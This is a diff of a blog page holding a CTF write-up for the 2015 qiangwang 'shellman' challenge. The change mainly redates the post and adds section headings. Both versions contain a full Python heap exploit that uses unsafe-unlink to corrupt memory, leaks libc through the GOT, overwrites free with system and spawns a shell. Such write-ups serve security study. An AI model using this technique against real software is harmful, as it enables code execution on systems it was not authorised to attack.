@@ -59,19 +59,19 @@
 
 
 
-<meta name="description" content="利用how2heap中提到的unsafe-unlink2的技巧，通过泄露libc来调用system
-from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./shellman.b400c663a0ca53f1f6c6fcbf60defa8d&apos;io      = zio(tar">
+<meta name="description" content="思路利用how2heap中提到的unsafe-unlink2的技巧，通过泄露libc来调用system
+expfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./shellman.b400c663a0ca53f1f6c6fcbf60defa8d&apos;io      = zi">
 <meta property="og:type" content="article">
 <meta property="og:title" content="qiangwang-qual-2015-shellman">
-<meta property="og:url" content="http://0byjwzsf.me/2016/07/21/qiangwang-qual-2015-shellman/index.html">
+<meta property="og:url" content="http://0byjwzsf.me/2016/07/24/qiangwang-qual-2015-shellman/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="利用how2heap中提到的unsafe-unlink2的技巧，通过泄露libc来调用system
-from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./shellman.b400c663a0ca53f1f6c6fcbf60defa8d&apos;io      = zio(tar">
-<meta property="og:updated_time" content="2016-07-21T06:41:21.000Z">
+<meta property="og:description" content="思路利用how2heap中提到的unsafe-unlink2的技巧，通过泄露libc来调用system
+expfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./shellman.b400c663a0ca53f1f6c6fcbf60defa8d&apos;io      = zi">
+<meta property="og:updated_time" content="2016-07-24T06:52:37.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="qiangwang-qual-2015-shellman">
-<meta name="twitter:description" content="利用how2heap中提到的unsafe-unlink2的技巧，通过泄露libc来调用system
-from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./shellman.b400c663a0ca53f1f6c6fcbf60defa8d&apos;io      = zio(tar">
+<meta name="twitter:description" content="思路利用how2heap中提到的unsafe-unlink2的技巧，通过泄露libc来调用system
+expfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./shellman.b400c663a0ca53f1f6c6fcbf60defa8d&apos;io      = zi">
 
 
 
@@ -288,8 +288,8 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
         <div class="post-meta">
           <span class="post-time">
             发表于
-            <time itemprop="dateCreated" datetime="2016-07-21T14:41:21+08:00" content="2016-07-21">
-              2016-07-21
+            <time itemprop="dateCreated" datetime="2016-07-24T14:52:37+08:00" content="2016-07-24">
+              2016-07-24
             </time>
           </span>
 
@@ -314,8 +314,8 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
             
               <span class="post-comments-count">
               &nbsp; | &nbsp;
-              <a href="/2016/07/21/qiangwang-qual-2015-shellman/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/21/qiangwang-qual-2015-shellman/" itemprop="commentsCount"></span>
+              <a href="/2016/07/24/qiangwang-qual-2015-shellman/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/24/qiangwang-qual-2015-shellman/" itemprop="commentsCount"></span>
               </a>
             </span>
             
@@ -334,8 +334,8 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
       
 
       
-        <span itemprop="articleBody"><p>利用<a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">how2heap</a>中提到的<code>unsafe-unlink2</code>的技巧，通过泄露libc来调用system</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./shellman.b400c663a0ca53f1f6c6fcbf60defa8d'</span></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">100000</span>)</span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007b0])    # new</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x400790])     # delete</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007a0])     # edit</span></span><br><span class="line">io.gdb_hint([<span class="number">0x4007a7</span>])     <span class="comment"># edit finish</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007c0])     # list</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_shellcode</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'SHELLC0DE 0: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_shellcode</span><span class="params">(shellcode)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Length of new shellcode: '</span>)</span><br><span class="line">    io.writeline(str(len(shellcode)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your shellcode(in raw format): '</span>)</span><br><span class="line">    io.writeline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_shellcode</span><span class="params">(index, shellcode)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Shellcode number: '</span>)</span><br><span class="line">    io.writeline(str(index))</span><br><span class="line">    io.read_until(<span class="string">'Length of shellcode: '</span>)</span><br><span class="line">    io.writeline(str(len(shellcode)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your shellcode: '</span>)</span><br><span class="line">    io.writeline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_shellcode</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Shellcode number: '</span>)</span><br><span class="line">    io.writeline(str(index))</span><br><span class="line"></span><br><span class="line">new_shellcode(<span class="string">'A'</span> * <span class="number">0x90</span>)</span><br><span class="line">new_shellcode(<span class="string">'B'</span> * <span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">adr_shellcode0  = <span class="number">0x6016d0</span></span><br><span class="line"></span><br><span class="line">fake0   =   l64(<span class="number">0x30</span>)</span><br><span class="line">fake0   +=  l64(<span class="number">0x91</span>)</span><br><span class="line">fake0   +=  l64(adr_shellcode0 - <span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">fake0   +=  l64(adr_shellcode0 - <span class="number">0x8</span> * <span class="number">2</span>)</span><br><span class="line">fake0   =   fake0.ljust(<span class="number">0x90</span>, <span class="string">'A'</span>)</span><br><span class="line">fake1   =   l64(<span class="number">0x90</span>)</span><br><span class="line">fake1   +=  l64(<span class="number">0xa0</span>)</span><br><span class="line">payload = fake0 + fake1</span><br><span class="line"></span><br><span class="line">edit_shellcode(<span class="number">0</span>, payload)</span><br><span class="line">del_shellcode(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">got_free    = <span class="number">0x601600</span></span><br><span class="line">edit_shellcode(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">0x8</span> + l64(<span class="number">0x1</span>) + l64(<span class="number">0x8</span>) + l64(got_free))</span><br><span class="line">list_shellcode()</span><br><span class="line"></span><br><span class="line">adr_free        = l64(io.read(<span class="number">0x10</span>).decode(<span class="string">'hex'</span>))</span><br><span class="line">offset_free     = <span class="number">0x82df0</span></span><br><span class="line">libc_base       = adr_free - offset_free</span><br><span class="line">offset_system   = <span class="number">0x46640</span></span><br><span class="line">adr_system      = libc_base + offset_system</span><br><span class="line"></span><br><span class="line">edit_shellcode(<span class="number">0</span>, l64(adr_system))</span><br><span class="line"></span><br><span class="line">new_shellcode(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">del_shellcode(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+        <span itemprop="articleBody"><h2 id="思路">思路</h2><p>利用<a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">how2heap</a>中提到的<code>unsafe-unlink2</code>的技巧，通过泄露libc来调用system</p>
+<h2 id="exp">exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./shellman.b400c663a0ca53f1f6c6fcbf60defa8d'</span></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">100000</span>)</span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007b0])    # new</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x400790])     # delete</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007a0])     # edit</span></span><br><span class="line">io.gdb_hint([<span class="number">0x4007a7</span>])     <span class="comment"># edit finish</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007c0])     # list</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_shellcode</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'SHELLC0DE 0: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_shellcode</span><span class="params">(shellcode)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Length of new shellcode: '</span>)</span><br><span class="line">    io.writeline(str(len(shellcode)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your shellcode(in raw format): '</span>)</span><br><span class="line">    io.writeline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_shellcode</span><span class="params">(index, shellcode)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Shellcode number: '</span>)</span><br><span class="line">    io.writeline(str(index))</span><br><span class="line">    io.read_until(<span class="string">'Length of shellcode: '</span>)</span><br><span class="line">    io.writeline(str(len(shellcode)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your shellcode: '</span>)</span><br><span class="line">    io.writeline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_shellcode</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Shellcode number: '</span>)</span><br><span class="line">    io.writeline(str(index))</span><br><span class="line"></span><br><span class="line">new_shellcode(<span class="string">'A'</span> * <span class="number">0x90</span>)</span><br><span class="line">new_shellcode(<span class="string">'B'</span> * <span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">adr_shellcode0  = <span class="number">0x6016d0</span></span><br><span class="line"></span><br><span class="line">fake0   =   l64(<span class="number">0x30</span>)</span><br><span class="line">fake0   +=  l64(<span class="number">0x91</span>)</span><br><span class="line">fake0   +=  l64(adr_shellcode0 - <span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">fake0   +=  l64(adr_shellcode0 - <span class="number">0x8</span> * <span class="number">2</span>)</span><br><span class="line">fake0   =   fake0.ljust(<span class="number">0x90</span>, <span class="string">'A'</span>)</span><br><span class="line">fake1   =   l64(<span class="number">0x90</span>)</span><br><span class="line">fake1   +=  l64(<span class="number">0xa0</span>)</span><br><span class="line">payload = fake0 + fake1</span><br><span class="line"></span><br><span class="line">edit_shellcode(<span class="number">0</span>, payload)</span><br><span class="line">del_shellcode(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">got_free    = <span class="number">0x601600</span></span><br><span class="line">edit_shellcode(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">0x8</span> + l64(<span class="number">0x1</span>) + l64(<span class="number">0x8</span>) + l64(got_free))</span><br><span class="line">list_shellcode()</span><br><span class="line"></span><br><span class="line">adr_free        = l64(io.read(<span class="number">0x10</span>).decode(<span class="string">'hex'</span>))</span><br><span class="line">offset_free     = <span class="number">0x82df0</span></span><br><span class="line">libc_base       = adr_free - offset_free</span><br><span class="line">offset_system   = <span class="number">0x46640</span></span><br><span class="line">adr_system      = libc_base + offset_system</span><br><span class="line"></span><br><span class="line">edit_shellcode(<span class="number">0</span>, l64(adr_system))</span><br><span class="line"></span><br><span class="line">new_shellcode(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">del_shellcode(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
 </span>
       
     </div>
@@ -347,8 +347,8 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/07/21/def-con-qual-2016-babyfirst/" rel="next" title="def-con-qual-2016-babyfirst">
-                <i class="fa fa-chevron-left"></i> def-con-qual-2016-babyfirst
+              <a href="/2016/07/24/pwnable-rookiss/" rel="next" title="Pwnable.kr [Rookiss] writeups">
+                <i class="fa fa-chevron-left"></i> Pwnable.kr [Rookiss] writeups
               </a>
             
           </div>
@@ -428,7 +428,7 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">4</span>
+              <span class="site-state-item-count">5</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -500,7 +500,7 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
               
             
             
-              <p class="post-toc-empty">此文章未包含目录</p>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">2.</span> <span class="nav-text">exp</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator">
@@ -764,9 +764,9 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
 
     <script type="text/javascript">
       var disqus_shortname = '0byjwzsf';
-      var disqus_identifier = '2016/07/21/qiangwang-qual-2015-shellman/';
+      var disqus_identifier = '2016/07/24/qiangwang-qual-2015-shellman/';
       var disqus_title = 'qiangwang-qual-2015-shellman';
-      var disqus_url = 'http://0byjwzsf.me/2016/07/21/qiangwang-qual-2015-shellman/';
+      var disqus_url = 'http://0byjwzsf.me/2016/07/24/qiangwang-qual-2015-shellman/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
